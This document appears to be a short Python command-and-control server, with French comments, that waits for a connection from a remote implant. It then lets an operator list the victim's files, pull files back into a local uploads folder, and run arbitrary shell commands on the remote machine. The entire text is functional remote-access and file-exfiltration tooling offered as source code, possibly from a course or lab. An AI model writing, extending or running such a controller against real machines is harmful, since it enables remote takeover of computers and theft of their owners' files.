import socket

index = 1000

def list_files(conn, param):
        tosend = "LIST#" + param
        conn.sendall(tosend.encode())
        data = conn.recv(1024)

        print(data.decode())

def upload_file(conn, param):
        global index

        tosend = "UPLOAD#" + param
        conn.sendall(tosend.encode())

        data = conn.recv(1024)

        f = open("uploads/upl" + str(index), "w")
        f.write(data.decode())
        index = index + 1
        f.close()

def cmd(conn, param):
        global index
        tosend = "CMD#" + param
        conn.sendall(tosend.encode())

        sz = ""
        flag = 1
        while flag == 1:
                data = conn.recv(1)
                if(data.decode() == "#"):
                        flag = 2
                else:
                        sz += data.decode()
        int(sz)
        data = conn.recv(int(sz))

        print(data.decode())

# le serveur accepte une connexion
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 12347))
        s.listen()

        conn, addr = s.accept()

        while True:
                uinp = input("[LCS@Comm&Control]$ ")

                verbe = ""
                param = ""

                etape = 1

                for lettre in uinp:
                        if(etape == 1):
                                if(lettre == " "):
                                        etape = 2
                                else:
                                        verbe += lettre
                        else:
                                param += lettre

                if(verbe == "ls"):
                        list_files(conn, param)
                elif(verbe == "get"):
                        upload_file(conn, param)
                elif(verbe == "cmd"):
                        cmd(conn, param)
                elif(verbe == "exit"):
                        s.shutdown(2)
                        s.close()
                        exit()
                else:
                        print("Unknown Command...")
